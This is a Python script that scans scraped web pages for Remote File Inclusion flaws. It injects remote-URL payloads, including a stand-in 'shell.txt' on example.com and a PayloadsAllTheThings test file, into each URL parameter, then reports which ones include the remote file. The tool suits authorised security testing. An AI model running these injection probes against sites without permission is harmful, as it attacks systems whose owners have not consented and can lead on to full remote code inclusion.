import asyncio
import aiohttp
import logging
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def test_rfi(session, url, param, value):
    rfi_payloads = [
        'http://example.com/shell.txt',
        'http://testphp.vulnweb.com/listproducts.php',
        'https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Remote%20File%20Inclusion/remote_file.txt'
    ]
    for payload in rfi_payloads:
        payloaded_url = url.replace(f"{param}={value}", f"{param}={payload}")
        try:
            response = await session.get(payloaded_url)
            response_text = await response.text()
            if 'example_shell' in response_text or 'Product' in response_text or 'Remote File Inclusion Test' in response_text:
                return True, payloaded_url
        except Exception as e:
            logger.error(f"Error testing RFI payload on {url}: {e}")
    return False, None

async def analyze_rfi(scraped_data):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        for page in scraped_data:
            url = page['URL']
            params = page.get('Parameters', {})
            for param, value in params.items():
                is_vulnerable, vulnerable_url = await test_rfi(session, url, param, value)
                if is_vulnerable:
                    vulnerabilities.append({
                        'url': url,
                        'parameter': param,
                        'is_vulnerable': True,
                        'type': 'RFI',
                        'payload': vulnerable_url,
                        'scan_data': f"Мы отправили запрос на {vulnerable_url} с RFI полезной нагрузкой и сервер включил удаленный файл."
                    })
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = asyncio.run(analyze_rfi(scraped_data))
    with open('rfi_vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
